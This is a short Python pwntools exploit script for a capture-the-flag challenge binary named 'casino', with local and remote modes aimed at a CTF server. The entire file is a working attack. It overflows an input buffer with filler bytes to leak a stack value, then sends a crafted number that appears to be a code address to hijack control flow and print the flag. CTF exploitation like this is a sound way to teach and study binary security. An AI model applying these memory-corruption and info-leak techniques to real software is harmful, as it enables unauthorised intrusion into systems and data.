from pwn import *
import sys
import os


def main():
    context(arch = 'i386', os = 'linux')
    # Choose TARGET
    if sys.argv[1] == "local":
        p = process('./casino')
        # Check if file named "flag" exists else create it
        if not os.path.exists("flag"):
            os.system('echo "SpeishFlag{MyLocalFlag}" > flag')


    elif sys.argv[1] == "remote":
        p = remote('isc2023.1337.cx', 10016)
    else:
        print("Usage: python3 exploit.py [local/remote]")
        sys.exit()

    to_send = b"23"
    p.sendline(to_send)

    to_send = b"B" * 36
    p.sendline(to_send)

    output = p.recvuntil(b"stop):")


    begin_of_as = output.find(b"B" * 36) + 36
    hex_value = output[begin_of_as: begin_of_as + 4]
    lucky_number = int.from_bytes(hex_value, byteorder="little")

    for i in range(56):
        p.sendline(b"9")

    p.sendline(b"134517334")
    p.sendline(b"9")
    p.sendline(str(lucky_number).encode())
    p.sendline(b"x")
    p.sendline(b"Y")

    output = p.recvall()
    idx = output.find(b"SpeishFlag")
    flag = output[idx:].decode()
    print("Flag:")
    print(flag)
    p.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py [local/remote]")
        sys.exit()
    main()